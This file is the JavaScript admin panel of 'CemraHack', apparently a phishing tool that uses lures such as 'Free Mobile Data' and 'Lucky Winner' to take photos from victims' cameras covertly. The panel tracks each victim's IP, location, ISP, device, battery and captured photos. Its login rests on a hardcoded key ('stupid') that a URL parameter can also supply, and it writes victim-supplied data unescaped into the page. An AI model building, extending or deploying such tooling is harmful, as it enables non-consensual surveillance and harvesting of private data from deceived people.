/* ================================================
   ADMIN.JS — Admin Panel Logic (CemraHack)
   ================================================ */

const SECRET_KEY = 'stupid';
const AUTH_KEY = 'cemra_admin_auth';

// ---- Auth Logic ----
function checkAuth() {
    const auth = sessionStorage.getItem(AUTH_KEY);
    const errorView = document.getElementById('errorView');
    const adminView = document.getElementById('adminView');

    // Check URL params for quick access (?key=stupid)
    const params = new URLSearchParams(window.location.search);
    if (params.get('key') === SECRET_KEY) {
        sessionStorage.setItem(AUTH_KEY, 'true');
        window.location.href = 'admin.html'; // Clean URL
        return;
    }

    if (auth === 'true') {
        errorView.classList.add('admin-hidden');
        adminView.classList.remove('admin-hidden');
        document.body.classList.remove('overflow-hidden');
        document.title = "CemraHack Admin Dashboard";
        initDashboard();
    }
}

// Secret trigger: Clicking the 404 title 5 times
let clickCount = 0;
document.querySelector('#errorView h1').onclick = () => {
    clickCount++;
    if (clickCount >= 5) {
        document.getElementById('authGate').classList.remove('admin-hidden');
        clickCount = 0;
    }
};

function tryLogin() {
    const pass = document.getElementById('adminPass').value;
    if (pass === SECRET_KEY) {
        sessionStorage.setItem(AUTH_KEY, 'true');
        location.reload();
    } else {
        showToast('Invalid Secret Key', 'error');
        document.getElementById('adminPass').value = '';
    }
}

function logout() {
    sessionStorage.removeItem(AUTH_KEY);
    location.reload();
}

// ---- Dashboard Logic ----
let currentSearch = '';

function initDashboard() {
    refreshData();
    // Poll for updates every 5 seconds
    setInterval(refreshData, 5000);
}

function refreshData() {
    // 1. Discover all session IDs from both Status keys and the Sessions list
    const sessionIds = new Set();

    // Scan localStorage keys for cemra_status_
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && key.startsWith('cemra_status_')) {
            sessionIds.add(key.replace('cemra_status_', ''));
        }
    }

    // Also include IDs from the main session list (even if they haven't connected yet)
    const legacyIds = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
    legacyIds.forEach(id => sessionIds.add(id));

    const listBody = document.getElementById('sessionsList');
    listBody.innerHTML = '';

    let totalCaptures = 0;
    let activeNow = 0;

    Array.from(sessionIds).forEach(id => {
        const statusData = JSON.parse(localStorage.getItem('cemra_status_' + id) || '{"status":"waiting"}');
        const captures = JSON.parse(localStorage.getItem('cemra_captures_' + id) || '[]');

        totalCaptures += captures.length;
        const isOnline = statusData.status !== 'offline' && statusData.status !== 'done' && statusData.status !== 'waiting' && (Date.now() - statusData.lastUpdate < 30000);
        if (isOnline) activeNow++;

        // Filter
        if (currentSearch) {
            const searchStr = (id + (statusData.ip || '') + (statusData.theme || '')).toLowerCase();
            if (!searchStr.includes(currentSearch.toLowerCase())) return;
        }

        const row = document.createElement('tr');
        row.innerHTML = `
            <td data-label="ID"><span class="user-id">${id.substring(0, 8)}...</span></td>
            <td data-label="IP Address">
                <div style="font-weight:600; color:#fff">${statusData.ip || '---'}</div>
                <div style="font-size:0.75rem; opacity:0.6">${statusData.city || ''} ${statusData.country || ''}</div>
            </td>
            <td data-label="Device">
                <div style="font-weight:500">${statusData.theme || 'Link Only'}</div>
                <div style="font-size:0.75rem; opacity:0.6">${statusData.platform || 'Waiting...'}</div>
            </td>
            <td data-label="Status">
                <span class="status-badge ${isOnline ? 'status-online' : (statusData.status === 'waiting' ? '' : 'status-offline')}" 
                      style="${statusData.status === 'waiting' ? 'background:rgba(255,165,0,0.1); color:#ffa500;' : ''}">
                    <i class="fa-solid ${isOnline ? 'fa-circle' : (statusData.status === 'waiting' ? 'fa-clock' : 'fa-circle-dot')}"></i>
                    ${statusData.status ? statusData.status.toUpperCase() : 'UNKNOWN'}
                </span>
            </td>
            <td data-label="Photos"><b style="color:var(--primary)">${captures.length}</b></td>
            <td class="action-btns">
                <button class="btn-sm btn-view" onclick="openDetails('${id}')" title="Full Data">
                    <i class="fa-solid fa-info-circle"></i> Info
                </button>
                <button class="btn-sm btn-view" style="background:var(--primary)" onclick="viewResults('${id}')" ${captures.length === 0 ? 'disabled style="opacity:0.3; pointer-events:none;"' : ''}>
                    <i class="fa-solid fa-camera"></i>
                </button>
                <button class="btn-sm btn-delete" onclick="deleteSession('${id}')">
                    <i class="fa-solid fa-trash-can"></i>
                </button>
            </td>
        `;
        listBody.appendChild(row);
    });

    // Update Stats
    document.getElementById('statTotalSessions').textContent = sessionIds.size;
    document.getElementById('statActiveNow').textContent = activeNow;
    document.getElementById('statTotalCaptures').textContent = totalCaptures;

    // Calculate storage
    let bytes = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        bytes += (localStorage.getItem(key).length * 2);
    }
    document.getElementById('statStorage').textContent = (bytes / (1024 * 1024)).toFixed(2) + ' MB';
}

// ---- New Features ----

function filterSessions() {
    currentSearch = document.getElementById('adminSearch').value;
    refreshData();
}

function openDetails(id) {
    const data = JSON.parse(localStorage.getItem('cemra_status_' + id) || '{}');
    const modal = document.getElementById('detailsModal');
    const content = document.getElementById('modalContent');

    let html = '';
    const fields = [
        ['IP Address', data.ip],
        ['City', data.city],
        ['Country', data.country],
        ['ISP', data.isp],
        ['Device', data.platform],
        ['Browser', data.ua],
        ['Battery', data.battery],
        ['Charging', data.charging ? 'Yes' : 'No'],
        ['Screen', data.screen],
        ['Network', data.network],
        ['Last Seen', data.lastUpdate ? new Date(data.lastUpdate).toLocaleString() : 'N/A'],
        ['Theme Used', data.theme]
    ];

    fields.forEach(([label, val]) => {
        html += `
            <div class="modal-field">
                <div style="opacity:0.5; font-size:0.75rem; text-transform:uppercase;">${label}</div>
                <div style="color:#fff; word-break:break-all;">${val || 'N/A'}</div>
            </div>
        `;
    });

    content.innerHTML = html;
    document.getElementById('modalViewBtn').onclick = () => viewResults(id);
    modal.classList.remove('admin-hidden');
}

function closeModal() {
    document.getElementById('detailsModal').classList.add('admin-hidden');
}

function viewResults(id) {
    window.location.href = `results.html?s=${id}`;
}

function deleteSession(id) {
    if (!confirm(`Are you sure you want to delete session ${id}?`)) return;
    localStorage.removeItem('cemra_captures_' + id);
    localStorage.removeItem('cemra_status_' + id);

    const legacy = JSON.parse(localStorage.getItem('cemra_sessions') || '[]');
    const updated = legacy.filter(sid => sid !== id);
    localStorage.setItem('cemra_sessions', JSON.stringify(updated));

    showToast('Session deleted');
    refreshData();
}

function deleteAllSessions() {
    if (!confirm('DANGER: This will delete ALL session data and photos permanentely. Proceed?')) return;

    const keysToRemove = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && (key.startsWith('cemra_status_') || key.startsWith('cemra_captures_'))) {
            keysToRemove.push(key);
        }
    }
    keysToRemove.forEach(k => localStorage.removeItem(k));
    localStorage.removeItem('cemra_sessions');

    showToast('All data cleared', 'error');
    refreshData();
}

function addSampleData() {
    const samples = [
        { id: 'SAMP-1234-ABCD', ip: '103.5.122.1', city: 'Karachi', country: 'Pakistan', platform: 'Android (Chrome)', theme: 'Free Mobile Data', battery: '82%', status: 'done', captures: 5 },
        { id: 'SAMP-5678-EFGH', ip: '192.168.1.5', city: 'Lahore', country: 'Pakistan', platform: 'iPhone (Safari)', theme: 'Lucky Winner', battery: '14%', status: 'capturing', captures: 8 },
        { id: 'SAMP-9012-IJKL', ip: '45.12.90.22', city: 'Dubai', country: 'UAE', platform: 'Windows (Edge)', theme: 'Video Verification', battery: '100%', status: 'offline', captures: 10 }
    ];

    samples.forEach(s => {
        localStorage.setItem('cemra_status_' + s.id, JSON.stringify({
            ip: s.ip, city: s.city, country: s.country, isp: 'Sample Provider', platform: s.platform,
            ua: 'Mozilla/5.0 Sample Data', screen: '1080x1920', lang: 'en', battery: s.battery, charging: false,
            status: s.status, lastUpdate: Date.now(), theme: s.theme, network: '4g'
        }));

        // Add dummy captures
        const caps = [];
        for (let i = 0; i < s.captures; i++) {
            caps.push({ id: 'cap_' + i, src: 'https://via.placeholder.com/320x240', time: new Date().toISOString() });
        }
        localStorage.setItem('cemra_captures_' + s.id, JSON.stringify(caps));
    });

    showToast('Applied 3 samples!');
    refreshData();
}

// ---- UI Helpers ----
function showToast(msg, type = 'success') {
    const toast = document.getElementById('toast');
    const msgEl = document.getElementById('toastMsg');
    msgEl.textContent = msg;
    toast.style.background = type === 'error' ? '#ef4444' : 'rgba(124, 58, 237, 0.9)';
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', checkAuth);
